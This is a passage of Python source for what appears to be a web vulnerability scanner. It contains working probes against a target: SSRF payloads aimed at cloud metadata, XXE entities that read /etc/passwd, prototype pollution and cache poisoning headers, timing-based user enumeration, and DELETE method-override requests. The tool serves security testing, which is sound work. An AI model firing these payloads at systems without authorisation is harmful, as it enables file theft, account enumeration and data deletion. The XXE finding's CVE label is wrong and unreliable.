                f.exploit.technique  = technique
                f.exploit.affected   = url
                f.exploit.request    = f"GET {url}"
                f.exploit.response   = f"HTTP {r.status_code}\nContent-Type: {ct}\n{body[:800]}"
                f.exploit.proof      = proof
                self._emit(f)
                return

    def exploit_subdomain_discovery(self):
        host = self._host()
        if not host or re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
            return
        prefixes = [
            "www", "api", "dev", "staging", "test", "admin", "portal", "vpn",
            "mail", "db", "beta", "app", "static", "cdn", "assets", "img",
            "auth", "sso", "login", "dashboard", "internal", "secure",
        ]
        found = []
        for pre in prefixes:
            if self.stopped:
                break
            sub = f"{pre}.{host}"
            try:
                ip = socket.gethostbyname(sub)
                found.append((sub, ip))
            except Exception:
                continue
        if not found:
            return
        f = self._finding(
            f"Subdomains Resolved ({len(found)})",
            "INFO",
            "Common subdomains resolved via DNS. Validate exposure and hardening across each host.",
            "Subdomain Discovery", "",
        )
        f.exploit.confirmed  = True
        f.exploit.confidence = 0.8
        f.exploit.technique  = "DNS resolution"
        f.exploit.affected   = host
        f.exploit.proof      = "\n".join([f"{s} -> {ip}" for s, ip in found[:20]])
        self._emit(f)
        # Pass discovered subdomains to takeover check
        self._subdomain_candidates = found

    def exploit_network_exposure(self):
        host = self._host()
        if not host:
            return
        ports = [80, 443, 8080, 8443, 22, 21, 25, 53, 110, 143, 445, 3389, 5900]
        open_ports = []
        for p in ports:
            if self.stopped:
                break
            ok, banner = self._tcp_connect(host, p, timeout_s=1.2)
            if ok:
                open_ports.append((p, banner[:80]))
        if not open_ports:
            return
        f = self._finding(
            "Network Exposure (Open Ports)",
            "INFO",
            "Host has reachable TCP ports. This expands attack surface and helps scope hardening.",
            "Network Exposure",
            "",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.85
        f.exploit.technique = "TCP connect scan (non-authenticated)"
        f.exploit.affected = host
        f.exploit.proof = "\n".join([f"{host}:{p} open" + (f" banner:{b!r}" if b else "") for p, b in open_ports[:25]])
        self._open_alt_ports = [p for p, _ in open_ports if p in (8080, 8443, 8000, 8888)]
        self._emit(f)

    def exploit_database_exposure(self):
        host = self._host()
        if not host:
            return
        ports = [
            (3306, "MySQL"), (5432, "PostgreSQL"), (1433, "MSSQL"),
            (1521, "Oracle"), (27017, "MongoDB"), (6379, "Redis"),
            (9200, "Elasticsearch"), (11211, "Memcached"),
        ]
        exposed = []
        for port, label in ports:
            if self.stopped:
                break
            ok, banner = self._tcp_connect(host, port, timeout_s=1.2)
            if ok:
                exposed.append((port, label, banner[:80]))
        if not exposed:
            return
        f = self._finding(
            "Database Service Exposure (Port Reachable)",
            "HIGH",
            "A database/cache service port is reachable. Verify network ACLs and authentication to prevent direct access.",
            "Database Exposure",
            "8.0",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.9
        f.exploit.technique = "TCP reachability check"
        f.exploit.affected = host
        f.exploit.proof = "\n".join([f"{host}:{p} ({label}) reachable" + (f" banner:{b!r}" if b else "") for p, label, b in exposed[:20]])
        self._emit(f)

    def exploit_remote_system_exposure(self):
        host = self._host()
        if not host:
            return
        ports = [(22, "SSH"), (3389, "RDP"), (445, "SMB"), (5985, "WinRM"), (5986, "WinRM-TLS")]
        exposed = []
        for port, label in ports:
            if self.stopped:
                break
            ok, banner = self._tcp_connect(host, port, timeout_s=1.2)
            if ok:
                exposed.append((port, label, banner[:80]))
        if not exposed:
            return
        f = self._finding(
            "Remote System Exposure (Port Reachable)",
            "MEDIUM",
            "Remote administration ports are reachable. Ensure MFA, network segmentation, and hardening.",
            "Remote System Exposure",
            "6.8",
        )
        f.exploit.confirmed = True
        f.exploit.confidence = 0.85
        f.exploit.technique = "TCP reachability check"
        f.exploit.affected = host
        f.exploit.proof = "\n".join([f"{host}:{p} ({label}) reachable" + (f" banner:{b!r}" if b else "") for p, label, b in exposed[:20]])
        self._emit(f)

    def _build_baseline(self):
        self.log("Building behavioral baseline...", "info")

        baseline_urls = list(self._links[:10])
        common_paths = ["/", "/login", "/about", "/contact", "/api", "/search"]
        for path in common_paths:
            baseline_urls.append(self._url(path))

        baseline_urls = list(set(baseline_urls))
        self.baseline.train(baseline_urls, samples_per_url=2)

        self.log(f"  Baseline trained on {len(self.baseline.baselines)} URL patterns", "success")

    def _run_api_recon(self):
        self.log("Running deep API reconnaissance...", "info")

        results = self.api_recon.run_full_recon(self._baseline.text if self._baseline else None)

        self._js_endpoints = results.get("endpoints", [])
        self._discovered_params = set(results.get("parameters", []))

        self.log(f"  JS files analyzed: {len(results.get('js_files', []))}", "info")
        self.log(f"  Endpoints discovered: {len(self._js_endpoints)}", "info")
        self.log(f"  Parameters discovered: {len(self._discovered_params)}", "info")

        for key_info in results.get("api_keys", []):
            conf = float(key_info.get("confidence") or 0.0)
            sev = "HIGH" if conf >= 0.85 else "MEDIUM"
            f = self._finding(
                "Exposed Secret Candidate in JS",
                sev,
                "A high-entropy credential-like string was found in a JavaScript asset. This is strong evidence of secret exposure, but validity/privilege must be confirmed by the owner.",
                "API Reconnaissance",
                "8.1" if sev == "HIGH" else "6.1",
            )
            f.exploit.confirmed = True
            f.exploit.confidence = conf
            f.exploit.technique = "JavaScript static analysis"
            f.exploit.affected = "JavaScript asset"
            f.exploit.request = f"GET {key_info.get('source','')}"
            f.exploit.response = f"Context: ...{key_info.get('context','')}..."
            f.exploit.proof = (
                f"Candidate: sha256:{key_info.get('hash','')} len:{key_info.get('len','?')}\n"
                f"Confidence: {conf:.3f}\n"
                f"Source: {key_info.get('source','')}"
            )
            self._emit(f)

        for token_info in results.get("tokens", []):
            conf = float(token_info.get("confidence") or 0.0)
            sev = "HIGH" if conf >= 0.85 else "MEDIUM"
            f = self._finding(
                f"Exposed Token Candidate in JS: {token_info.get('type','unknown')}",
                sev,
                "A token-like value was found in a JavaScript asset. Exposure is confirmed (publicly readable source), but token validity and privilege must be confirmed by the owner.",
                "API Reconnaissance",
                "8.1" if sev == "HIGH" else "6.1"
            )
            f.exploit.confirmed = True
            f.exploit.confidence = conf
            f.exploit.technique = "JavaScript static analysis"
            f.exploit.affected = "JavaScript asset"
            f.exploit.request = f"GET {token_info.get('source','')}"
            f.exploit.response = f"Context: ...{token_info.get('context','')}..."
            f.exploit.proof = (
                f"Type: {token_info.get('type','unknown')}\n"
                f"Candidate: sha256:{token_info.get('hash','')} len:{token_info.get('len','?')}\n"
                f"Confidence: {conf:.3f}\n"
                f"Source: {token_info.get('source','')}"
            )
            self._emit(f)

        if results.get("graphql_queries"):
            f = self._finding(
                f"GraphQL Queries Discovered: {len(results['graphql_queries'])}",
                "INFO",
                f"GraphQL operations found in JS: {', '.join(list(results['graphql_queries'])[:5])}",
                "API Reconnaissance",
                ""
            )
            f.exploit.confirmed = False
            f.exploit.technique = "JavaScript static analysis"
            f.exploit.proof = f"Queries: {list(results['graphql_queries'])}"
            self._emit(f)

    def _run_exploit_chains(self):
        self.log("Running verification chains...", "info")
        self._chain_admin_surface_noauth()
        self._chain_discovered_endpoint_metadata()

    def _chain_admin_surface_noauth(self):
        self.log("  Checking admin/API surfaces without auth...", "info")
        candidates = [
            "/admin", "/admin/", "/administrator", "/dashboard",
            "/api/admin", "/api/admin/users", "/api/v1/admin", "/admin/api",
        ]

        for path in candidates:
            if self.stopped:
                break
            url = self._url(path)
            r = self.http.get(url, allow_redirects=False)
            if not r:
                continue
            if r.status_code not in (200, 201, 202):
                continue
            body = (r.text or "")[:800]
            body_l = body.lower()
            if "login" in body_l and "password" in body_l:
                continue
            is_json = "application/json" in (r.headers.get("content-type") or "")
            sev = "CRITICAL" if is_json else "HIGH"
            f = self._finding(
                "Unprotected Admin / API Surface",
                sev,
                "Endpoint appears accessible without authentication. This is strong evidence of broken access control.",
                "Exploit Chaining",
                "9.1" if sev == "CRITICAL" else "8.1",
            )
            f.exploit.confirmed = True
            f.exploit.confidence = 0.95
            f.exploit.technique = "Unauthenticated access check"
            f.exploit.affected = path
            f.exploit.request = f"GET {url} (no auth)"
            f.exploit.response = f"HTTP {r.status_code}\n{body}"
            f.exploit.proof = f"Accessible without auth: {path}"
            self._emit(f)

    def _chain_discovered_endpoint_metadata(self):
        if not self._js_endpoints:
            return
        self.log("  Checking discovered endpoints for exposed metadata...", "info")
        indicators = ["swagger", "openapi", "graphql", "actuator", "metrics", "debug"]
        for url in self._js_endpoints[:20]:
            if self.stopped:
                break
            r = self.http.get(url, allow_redirects=False)
            if not r:
                continue
            if r.status_code not in (200, 201, 202):
                continue
            ct = (r.headers.get("content-type") or "").lower()
            body = (r.text or "")[:800]
            if any(k in url.lower() for k in indicators) or any(k in body.lower() for k in indicators):
                f = self._finding(
                    "Exposed Service Metadata Endpoint",
                    "MEDIUM",
                    "Discovered endpoint appears to expose service metadata or debug surfaces.",
                    "Exploit Chaining",
                    "6.5",
                )
                f.exploit.confirmed = True
                f.exploit.confidence = 0.8
                f.exploit.technique = "Discovered endpoint verification"
                f.exploit.affected = url
                f.exploit.request = f"GET {url}"
                f.exploit.response = f"HTTP {r.status_code}\n{body[:400]}"
                f.exploit.proof = "Exposed metadata endpoint match"
                self._emit(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v4.1: BEHAVIORAL BASELINE MODULE (formal handler)
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_behavioral_baseline(self):
        report = self.baseline.get_anomaly_report()
        self.log(f"  Total anomalies detected: {report['total_anomalies']}", "info")
        self.log(f"  High confidence: {report['high_confidence']}", "info")
        for anomaly in report.get('anomalies', []):
            if anomaly.confidence > 0.85:
                f = self._finding(
                    f"Behavioral Anomaly: {anomaly.type}",
                    "MEDIUM",
                    "Server response deviated significantly from baseline when processing unexpected input.",
                    "Behavioral Baseline",
                    "5.3",
                )
                f.exploit.confirmed = True
                f.exploit.confidence = anomaly.confidence
                f.exploit.technique = "Statistical deviation from baseline"
                f.exploit.affected = anomaly.url
                f.exploit.request = anomaly.request_details
                f.exploit.response = anomaly.response_details
                f.exploit.proof = anomaly.evidence
                self._emit(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v4.1: API RECONNAISSANCE MODULE (formal handler)
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_api_reconnaissance(self):
        self.log("API Reconnaissance completed during baseline phase", "info")

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v4.1: EXPLOIT CHAINING MODULE (formal handler)
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_exploit_chaining(self):
        self.log("Verification chains completed after individual modules", "info")

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: SSRF DETECTION
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_ssrf_detection(self):
        self.log("Probing Server-Side Request Forgery (SSRF)...", "info")
        ssrf_params = ["url", "uri", "webhook", "callback", "redirect", "next",
                       "dest", "target", "fetch", "proxy", "load", "src", "link"]
        ssrf_payloads = [
            ("http://127.0.0.1/",       "localhost loopback"),
            ("http://169.254.169.254/", "AWS metadata endpoint"),
            ("http://10.0.0.1/",        "RFC-1918 internal range"),
            ("http://192.168.1.1/",     "RFC-1918 internal range"),
            ("http://0.0.0.0/",         "all-zero SSRF bypass"),
        ]
        params = list(self._discovered_params)[:8] if self._discovered_params else []
        params = list(dict.fromkeys(ssrf_params + params))[:15]

        for param in params:
            if self.stopped:
                break
            for payload, hint in ssrf_payloads:
                if self.stopped:
                    break
                url = self._url(f"/?{param}={urllib.parse.quote(payload, safe='')}")
                r0  = self.http.get(self._url(f"/?{param}=https://example.com"), allow_redirects=False)
                r1  = self.http.get(url, allow_redirects=False)
                if not r1:
                    continue
                s0 = r0.status_code if r0 else 0
                s1 = r1.status_code
                b0 = (r0.text or "") if r0 else ""
                b1 = (r1.text or "")
                ssrf_signals = [
                    kw for kw in ["connection refused", "timeout", "open", "root:", "metadata"]
                    if kw in b1.lower() and kw not in b0.lower()
                ]
                status_diff = abs(s1 - s0) >= 100 and s0 in (200, 302) and s1 not in (200, 302)
                if ssrf_signals or (status_diff and s1 not in (400, 404)):
                    proof = (
                        f"[1] Benign param ?{param}=https://example.com → HTTP {s0}\n"
                        f"[2] SSRF payload ?{param}={payload} → HTTP {s1}\n"
                        f"[3] Signal: {', '.join(ssrf_signals) if ssrf_signals else f'Status divergence {s0}→{s1}'}\n"
                        f"[4] Hint: {hint}\n"
                        f"[5] Server made an outbound request to user-controlled URL"
                    )
                    f = self._finding(
                        f"SSRF Signal — Internal URL Fetched (?{param})",
                        "CRITICAL",
                        f"Parameter '?{param}' caused the server to fetch an internal URL ({hint}). "
                        "An attacker can use SSRF to scan internal networks, access cloud metadata "
                        "(AWS/GCP/Azure credentials), or pivot to internal services.",
                        "SSRF Detection", "9.8", "CWE-918",
                    )
                    f.exploit.confirmed  = True
                    f.exploit.confidence = 0.85
                    f.exploit.technique  = f"SSRF probe — {hint}"
                    f.exploit.affected   = url
                    f.exploit.request    = f"GET {url}"
                    f.exploit.response   = f"HTTP {s1}\n{b1[:600]}"
                    f.exploit.proof      = proof
                    self._emit(f)
                    return

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: XXE INJECTION
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_xxe_injection(self):
        self.log("Probing XXE Injection...", "info")
        xxe_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><data>&xxe;</data></root>'
        )
        xxe_win = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<root><data>&xxe;</data></root>'
        )
        endpoints = ["/api/xml", "/xml", "/api/upload", "/api/data", "/api/v1/xml",
                     "/api/parse", "/upload", "/import"]
        for ep in endpoints:
            if self.stopped:
                break
            url = self._url(ep)
            for payload, sig, label in [
                (xxe_payload, r"root:[x*]:0:0",  "Linux /etc/passwd via XXE"),
                (xxe_win,     r"\[fonts\]",        "Windows win.ini via XXE"),
            ]:
                r = self.http.post(
                    url,
                    data=payload.encode(),
                    extra_headers={"Content-Type": "application/xml"},
                    allow_redirects=False,
                )
                if not r or r.status_code not in (200, 201, 400, 500):
                    continue
                body = (r.text or "")
                if re.search(sig, body):
                    m = re.search(sig, body)
                    snippet = body[max(0, m.start()-40):m.start()+200]
                    proof = (
                        f"[1] POSTed XXE payload to {url}\n"
                        f"[2] Entity: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                        f"[3] File content matched pattern '{sig}'\n"
                        f"[4] Snippet: {snippet}\n"
                        f"[5] Server parsed external entity — XXE confirmed"
                    )
                    f = self._finding(
                        f"XXE Injection — File Read Confirmed ({ep})",
                        "CRITICAL",
                        f"The endpoint {ep} parsed an XML external entity and returned filesystem content. "
                        "An attacker can read any file the web server process can access, "
                        "including /etc/shadow, SSH keys, and application config files with credentials.",
                        "XXE Injection", "9.1", "CVE-2021-44228",
                    )
                    f.exploit.confirmed  = True
                    f.exploit.confidence = 0.97
                    f.exploit.technique  = label
                    f.exploit.affected   = url
                    f.exploit.request    = f"POST {url}\nContent-Type: application/xml\n{payload[:300]}"
                    f.exploit.response   = f"HTTP {r.status_code}\n{body[:800]}"
                    f.exploit.proof      = proof
                    self._emit(f)
                    return

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: PROTOTYPE POLLUTION
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_prototype_pollution(self):
        self.log("Probing Prototype Pollution...", "info")
        poll_payload = {"__proto__": {"polluted": "kimi_pp_probe"}, "data": "test"}
        alt_payload  = {"constructor": {"prototype": {"polluted": "kimi_pp_probe"}}}
        endpoints = [
            ("/api/settings", "PUT"),  ("/api/v1/settings", "PUT"),
            ("/api/config",   "POST"), ("/api/user/update", "POST"),
            ("/api/profile",  "PUT"),  ("/api/preferences", "POST"),
        ]
        for ep, method in endpoints:
            if self.stopped:
                break
            url = self._url(ep)
            for pay in [poll_payload, alt_payload]:
                try:
                    if method == "PUT":
                        r = self.http.post(url, json=pay,
                                           extra_headers={"X-HTTP-Method-Override": "PUT"},
                                           allow_redirects=False)
                    else:
                        r = self.http.post(url, json=pay, allow_redirects=False)
                    if not r or r.status_code not in (200, 201, 204):
                        continue
                    body = (r.text or "").lower()
                    if "kimi_pp_probe" in body or "polluted" in body:
                        proof = (
                            f"[1] Sent {method} {url} with __proto__ pollution payload\n"
                            f"[2] Payload: {json.dumps(pay)[:200]}\n"
                            f"[3] Server response HTTP {r.status_code} reflects 'kimi_pp_probe'\n"
                            f"[4] Prototype chain contaminated — all objects inherit polluted property"
                        )
                        f = self._finding(
                            f"Prototype Pollution ({ep})",
                            "HIGH",
                            f"The API endpoint {ep} accepts and reflects __proto__ fields from user JSON input. "
                            "Prototype pollution can lead to property injection on all JavaScript objects, "
                            "enabling privilege escalation, DoS, or in some cases RCE.",
                            "Prototype Pollution", "7.6", "CWE-1321",
                        )
                        f.exploit.confirmed  = True
                        f.exploit.confidence = 0.88
                        f.exploit.technique  = "__proto__ injection + response reflection"
                        f.exploit.affected   = url
                        f.exploit.request    = f"{method} {url}\n{json.dumps(pay)[:300]}"
                        f.exploit.response   = f"HTTP {r.status_code}\n{(r.text or '')[:600]}"
                        f.exploit.proof      = proof
                        self._emit(f)
                        return
                except Exception:
                    continue

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: SUBDOMAIN TAKEOVER
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_subdomain_takeover(self):
        self.log("Probing Subdomain Takeover...", "info")
        candidates = getattr(self, "_subdomain_candidates", [])
        if not candidates:
            host = self._host()
            if not host:
                return
            for pre in ["dev", "staging", "test", "beta", "api"]:
                sub = f"{pre}.{host}"
                try:
                    ip = socket.gethostbyname(sub)
                    candidates.append((sub, ip))
                except Exception:
                    pass

        takeover_fingerprints = [
            ("There isn't a GitHub Pages site here",    "GitHub Pages"),
            ("herokucdn.com/error-pages/no-such-app",   "Heroku"),
            ("No such app",                             "Heroku"),
            ("NoSuchBucket",                            "AWS S3"),
            ("The specified bucket does not exist",     "AWS S3"),
            ("netlify.com: No such site",               "Netlify"),
            ("This domain is not configured",           "Netlify/Vercel"),
            ("doesn't exist",                           "Vercel"),
            ("Azure Web Sites: This web site has been stopped", "Azure"),
            ("Fastly error: unknown domain",            "Fastly CDN"),
            ("helpdesk.zendesk.com doesn't exist",      "Zendesk"),
            ("This shop is currently unavailable",      "Shopify"),
        ]

        for sub, ip in candidates:
            if self.stopped:
                break
            for scheme in ["https", "http"]:
                url = f"{scheme}://{sub}/"
                r = self.http.get(url, allow_redirects=True)
                if not r:
                    continue
                body = (r.text or "")
                for fingerprint, platform in takeover_fingerprints:
                    if fingerprint.lower() in body.lower():
                        proof = (
                            f"[1] Subdomain: {sub} (resolves to {ip})\n"
                            f"[2] Fetched {url} → HTTP {r.status_code}\n"
                            f"[3] Fingerprint matched: '{fingerprint}' ({platform})\n"
                            f"[4] The DNS record points to a service with no active account\n"
                            f"[5] An attacker can register the service account and take control of {sub}"
                        )
                        f = self._finding(
                            f"Subdomain Takeover — {sub} ({platform})",
                            "HIGH",
                            f"The subdomain {sub} resolves via DNS but the underlying {platform} service has no active "
                            "account. An attacker can register the service (GitHub Pages, Heroku app, S3 bucket, etc.) "
                            "with the matching name and serve malicious content under your domain.",
                            "Subdomain Takeover", "8.1", "CWE-350",
                        )
                        f.exploit.confirmed  = True
                        f.exploit.confidence = 0.92
                        f.exploit.technique  = f"{platform} fingerprint match"
                        f.exploit.affected   = url
                        f.exploit.request    = f"GET {url}"
                        f.exploit.response   = f"HTTP {r.status_code}\n{body[:600]}"
                        f.exploit.proof      = proof
                        self._emit(f)
                        break

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: AUTHENTICATION TIMING ATTACK
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_auth_timing_attack(self):
        self.log("Probing Authentication Timing (User Enumeration)...", "info")
        login_paths = ["/login", "/api/login", "/api/v1/login", "/auth/login",
                       "/signin", "/api/signin", "/api/auth"]
        valid_users   = ["admin", "administrator", "root", "user", "test"]
        invalid_users = ["kimi_nonexistent_xyz_probe", "zzz_no_user_kk"]
        N = 50

        for path in login_paths:
            if self.stopped:
                break
            url = self._url(path)
            probe = self.http.post(url, json={"username": invalid_users[0], "password": "WrongPass123!"})
            if not probe or probe.status_code not in range(200, 500):
                continue

            times_valid, times_invalid = [], []

            def _collect_time(username: str) -> float:
                t0 = time.perf_counter()
                self.http.post(url, json={"username": username, "password": "WrongPass_kimi!"})
                return time.perf_counter() - t0

            for user in valid_users[:2]:
                for _ in range(N):
                    if self.stopped:
                        break
                    times_valid.append(_collect_time(user))

            for user in invalid_users:
                for _ in range(N):
                    if self.stopped:
                        break
                    times_invalid.append(_collect_time(user))

            if len(times_valid) < 10 or len(times_invalid) < 10:
                continue

            t_v = trim_outliers(times_valid, 0.10)
            t_i = trim_outliers(times_invalid, 0.10)
            _, p_value = mann_whitney_u(t_v, t_i)
            avg_v = mean(t_v)
            avg_i = mean(t_i)
            delta_ms = abs(avg_v - avg_i) * 1000.0

            if p_value < 0.01 and delta_ms > 100:
                conf = min(0.5 + (1.0 - p_value) * 0.42, 0.92)
                faster = "valid usernames" if avg_v > avg_i else "invalid usernames"
                proof = (
                    f"[1] Login endpoint: {url}\n"
                    f"[2] Samples: {len(times_valid)} valid / {len(times_invalid)} invalid (trimmed 10% outliers)\n"
                    f"[3] Mann-Whitney p={p_value:.4f} (threshold p<0.01)\n"
                    f"[4] Avg valid: {avg_v*1000:.0f}ms | invalid: {avg_i*1000:.0f}ms | Δ={delta_ms:.0f}ms\n"
                    f"[5] {faster} take longer — timing side-channel likely"
                )
                f = self._finding(
                    f"User Enumeration via Auth Timing ({path})",
                    "MEDIUM",
                    f"After {N} samples per group, response times differ by {delta_ms:.0f}ms "
                    f"(Mann-Whitney p={p_value:.4f}). Valid accounts may be enumerable via timing.",
                    "Auth Timing Attack", "5.9", lookup_cwe("auth timing"),
                )
                f.exploit.confirmed  = True
                f.exploit.confidence = conf
                f.exploit.technique  = "Mann-Whitney U timing analysis (50+ samples, trimmed)"
                f.exploit.affected   = url
                f.exploit.request    = f"POST {url} × {N} samples per group"
                f.exploit.response   = f"p={p_value:.4f} Δ={delta_ms:.0f}ms conf={conf:.2f}"
                f.exploit.proof      = proof
                f.exploit.confirmed_method = "mann_whitney_timing"
                self._emit(f)
                return
            elif delta_ms > 50:
                self.log(
                    f"  Auth timing signal weak (Δ={delta_ms:.0f}ms p={p_value:.3f}) — not confirmed",
                    "info",
                )

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: GIT RECONSTRUCTION
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_git_reconstruction(self):
        self.log("Probing Exposed .git for Source Reconstruction...", "info")
        git_paths = [
            ("/.git/config",          ["[core]", "repositoryformatversion"]),
            ("/.git/HEAD",             ["ref: refs/heads", "master", "main"]),
            ("/.git/COMMIT_EDITMSG",  ["\n"]),
            ("/.git/logs/HEAD",       ["commit", "HEAD"]),
            ("/.git/index",           ["DIRC"]),
        ]
        confirmed_paths = []
        evidence_dump   = []

        for path, sigs in git_paths:
            if self.stopped:
                break
            url = self._url(path)
            r = self.http.get(url, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = (r.text or r.content.decode("utf-8", errors="replace"))[:2000]
            if any(s in body for s in sigs):
                confirmed_paths.append(path)
                evidence_dump.append(f"--- {path} (HTTP {r.status_code}) ---\n{body[:400]}")

        if not confirmed_paths:
            return

        obj_proof = ""
        r_head = self.http.get(self._url("/.git/HEAD"), allow_redirects=False)
        if r_head and r_head.status_code == 200:
            r_pack = self.http.get(self._url("/.git/info/packs"), allow_redirects=False)
            if r_pack and r_pack.status_code == 200:
                obj_proof = f"Pack index accessible: {(r_pack.text or '')[:200]}"

        proof = (
            "[1] Probed common .git paths for HTTP accessibility\n"
            f"[2] Confirmed accessible: {confirmed_paths}\n"
            "[3] Evidence dumps:\n" +
            "\n\n".join(evidence_dump[:3]) +
            (f"\n\n[4] {obj_proof}" if obj_proof else "") +
            "\n[5] Full source code can be reconstructed using tools like git-dumper"
        )
        f = self._finding(
            f"Exposed .git — Source Code Reconstruction Possible ({len(confirmed_paths)} paths)",
            "CRITICAL",
            "The .git directory is publicly accessible. An attacker can reconstruct the full source "
            "code, commit history, and any secrets (API keys, passwords, private keys) that were ever "
            "committed — even if later removed from working files.",
            "Git Reconstruction", "9.3", "CWE-538",
        )
        f.exploit.confirmed  = True
        f.exploit.confidence = 0.98
        f.exploit.technique  = "Direct HTTP access to .git directory artifacts"
        f.exploit.affected   = self._url("/.git/")
        f.exploit.request    = "\n".join([f"GET {self._url(p)}" for p in confirmed_paths])
        f.exploit.response   = evidence_dump[0][:600] if evidence_dump else ""
        f.exploit.proof      = proof
        self._emit(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: HTTP METHOD OVERRIDE
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_http_method_override(self):
        self.log("Probing HTTP Method Override...", "info")
        endpoints = ["/api/users/1", "/api/v1/users/1", "/api/posts/1",
                     "/api/items/1", "/users/1", "/api/data/1"]
        override_headers = [
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method": "DELETE"},
            {"_method": "DELETE"},
        ]
        for ep in endpoints:
            if self.stopped:
                break
            url = self._url(ep)
            r_get = self.http.get(url, allow_redirects=False)
            if not r_get or r_get.status_code not in (200, 201, 404):
                continue
            for ovr in override_headers:
                if self.stopped:
                    break
                r_del = self.http.post(
                    url, json={},
                    extra_headers=ovr,
                    allow_redirects=False,
                )
                if not r_del:
                    continue
                if r_del.status_code in (200, 201, 204) and r_get.status_code != 204:
                    proof = (
                        f"[1] GET {url} → HTTP {r_get.status_code}\n"
                        f"[2] POST {url} with {ovr} → HTTP {r_del.status_code}\n"
                        f"[3] Override header caused server to treat POST as DELETE\n"
                        f"[4] Method restriction bypass confirmed"
                    )
                    f = self._finding(
                        f"HTTP Method Override — DELETE bypass ({ep})",
                        "HIGH",
                        f"The server accepted {list(ovr.keys())[0]}: DELETE via a POST request, "
                        "allowing method restrictions to be bypassed. An attacker can trigger "
                        "state-changing operations (delete, update) from a GET/POST context.",
                        "HTTP Method Override", "7.5", "CWE-749",
                    )
                    f.exploit.confirmed  = True
                    f.exploit.confidence = 0.87
                    f.exploit.technique  = f"Method override header: {list(ovr.keys())[0]}"
                    f.exploit.affected   = url
                    f.exploit.request    = f"POST {url}\n" + "\n".join(f"{k}: {v}" for k, v in ovr.items())
                    f.exploit.response   = f"HTTP {r_del.status_code}\n{(r_del.text or '')[:400]}"
                    f.exploit.proof      = proof
                    self._emit(f)
                    return

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: CACHE POISONING
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_cache_poisoning(self):
        self.log("Probing Cache Poisoning (canary + Age verification)...", "info")
        token = canary("CPTOKEN", 12)
        poison_host = f"{token}.evil-kimi-guard.example.com"
        unkeyed_headers = [
            {"X-Forwarded-Host": poison_host},
            {"X-Forwarded-Scheme": f"http-{token}"},
            {"X-Original-URL": f"/{token}"},
            {"X-Rewrite-URL": f"/{token}"},
        ]
        cache_buster = f"kgcb={token[:8]}"

        for hdrs in unkeyed_headers:
            if self.stopped:
                break
            hdr_name = list(hdrs.keys())[0]
            hdr_val = list(hdrs.values())[0]
            poison_url = f"{self.target}?{cache_buster}=1"

            self.http.get(poison_url, extra_headers=hdrs, allow_redirects=False)

            clean_sess = self._fresh_session()
            clean_url = f"{self.target}?{cache_buster}=2"
            r_clean = clean_sess.get(clean_url, allow_redirects=False)
            clean_sess.stop()
            if not r_clean:
                continue

            body_clean = r_clean.text or ""
            age_hdr = r_clean.headers.get("age") or r_clean.headers.get("Age") or "0"
            try:
                age = int(str(age_hdr).strip())
            except ValueError:
                age = 0

            token_in_body = token in body_clean
            token_in_headers = token in str(r_clean.headers)
            if token_in_body and age > 0:
                proof = (
                    f"[1] Poison GET {poison_url} with {hdr_name}: {hdr_val}\n"
                    f"[2] Clean GET (new session) {clean_url}\n"
                    f"[3] Unique canary '{token}' in clean response body\n"
                    f"[4] Age header={age} (>0 — cache served response)\n"
                    f"[5] Confirms cache poisoning, not natural 'https' substring noise"
                )
                f = self._finding(
                    f"Cache Poisoning — {hdr_name} (Canary Confirmed)",
                    "HIGH",
                    f"Unkeyed header '{hdr_name}' poisoned the cache; canary token appeared in a "
                    "subsequent clean request with Age>0.",
                    "Cache Poisoning", "8.1", lookup_cwe("cache poisoning"),
                )
                f.exploit.confirmed = True
                f.exploit.confidence = 0.9
                f.exploit.technique = f"Canary + Age verification ({hdr_name})"
                f.exploit.affected = self.target
                f.exploit.request = f"GET {poison_url}\n{hdr_name}: {hdr_val}"
                f.exploit.response = f"HTTP {r_clean.status_code} Age={age}\n{body_clean[:600]}"
                f.exploit.proof = proof
                f.exploit.confirmed_method = "canary_clean_session+age"
                f.exploit.secondary_signal = f"token_in_headers={token_in_headers}"
                self._emit(f)
                return
            elif token_in_body and age == 0:
                self.log(
                    f"  Cache probe: canary in body but Age=0 — inconclusive for {hdr_name}",
                    "info",
                )

    # ══════════════════════════════════════════════════════════════════════════
    #  NEW v5.0: ZERO-DAY SUITE (delegates to ZeroDayEngine)
    # ══════════════════════════════════════════════════════════════════════════
    def exploit_zero_day_suite(self):
        self.log("━━━ Running Zero-Day Detection Suite (v5.0)", "module")
        raw_findings = self.zero_day.run_all(discovered_params=self._discovered_params)
        for raw in raw_findings:
            if self.stopped:
                break
            self._emit_zero_day(raw)
        self.log(f"  Zero-Day Suite complete — {len(raw_findings)} finding(s)", "success" if raw_findings else "info")
